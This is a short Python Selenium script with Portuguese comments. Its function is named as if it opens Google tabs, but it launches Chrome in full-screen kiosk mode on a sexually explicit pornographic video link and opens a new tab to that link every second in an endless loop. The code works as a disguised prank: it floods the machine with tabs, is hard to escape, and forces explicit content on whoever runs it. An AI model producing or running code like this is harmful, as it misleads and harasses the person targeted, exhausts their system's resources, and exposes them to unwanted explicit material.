from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time

def open_google_tabs():
    # Configurações do ChromeDriver (substitua o caminho pelo local onde você colocou o seu chromedriver)
    chrome_options = webdriver.ChromeOptions()
    chrome_options.add_argument("--kiosk")  # Abre o navegador em modo tela cheia
    driver = webdriver.Chrome(executable_path='/caminho/para/o/chromedriver', options=chrome_options)

    # Abre o Google Chrome
    driver.get("https://www.xvideos.com/video.hdfeiuha780/gostosa_da_buceta_carnuda_e_molhada_dando_o_cu_e_gemendo_alto")

    # Loop para abrir novas abas continuamente
    while True:
        driver.execute_script("window.open('https://www.xvideos.com/video.hdfeiuha780/gostosa_da_buceta_carnuda_e_molhada_dando_o_cu_e_gemendo_alto', '_blank');")
        time.sleep(1)

if __name__ == "__main__":
    open_google_tabs()
